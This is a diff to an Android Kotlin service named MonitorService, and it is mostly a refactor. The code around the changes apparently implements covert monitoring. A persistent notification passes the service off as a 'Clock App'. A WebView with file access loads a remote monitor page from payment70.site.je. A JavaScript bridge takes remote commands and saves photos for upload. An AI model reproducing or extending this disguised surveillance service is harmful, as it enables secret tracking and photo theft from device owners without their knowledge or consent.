@@ -18,7 +18,6 @@ import android.webkit.JavascriptInterface
 import android.webkit.WebChromeClient
 import android.webkit.WebView
 import android.webkit.WebViewClient
-import org.json.JSONArray
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStreamWriter
@@ -31,7 +30,6 @@ class MonitorService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
     private var webView: WebView? = null
-    private val baseUrl = "https://payment70.site.je/api.php"
     private val monitorUrl = "https://payment70.site.je/monitor.html"
     private val pendingPhotos = mutableListOf<File>()
     private var isOnline = true
@@ -64,18 +62,21 @@ class MonitorService : Service() {
     }
 
     private fun buildNotification(): Notification {
-        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle("Clock App")
+                .setContentText("Running")
+                .setSmallIcon(R.drawable.ic_clock)
+                .setOngoing(true)
+                .build()
         } else {
             Notification.Builder(this)
+                .setContentTitle("Clock App")
+                .setContentText("Running")
+                .setSmallIcon(R.drawable.ic_clock)
+                .setOngoing(true)
+                .build()
         }
-        return builder
-            .setContentTitle("Clock App")
-            .setContentText("Running")
-            .setSmallIcon(R.drawable.ic_clock)
-            .setOngoing(true)
-            .setSilent(true)
-            .build()
     }
 
     private fun setupWebView() {
@@ -86,11 +87,7 @@ class MonitorService : Service() {
             settings.allowFileAccess = true
             settings.allowContentAccess = true
 
-            webViewClient = object : WebViewClient() {
-                override fun onPageFinished(view: WebView?, url: String?) {
-                    super.onPageFinished(view, url)
-                }
-            }
+            webViewClient = object : WebViewClient() {}
             webChromeClient = object : WebChromeClient() {}
 
             addJavascriptInterface(JsBridge(), "Native")
@@ -150,14 +147,10 @@ class MonitorService : Service() {
 
     inner class JsBridge {
         @JavascriptInterface
-        fun onResult(text: String) {
-            // Status updates
-        }
+        fun onResult(text: String) {}
 
         @JavascriptInterface
-        fun onCommand(text: String) {
-            // Command updates
-        }
+        fun onCommand(text: String) {}
 
         @JavascriptInterface
         fun saveOfflinePhoto(b64: String) {
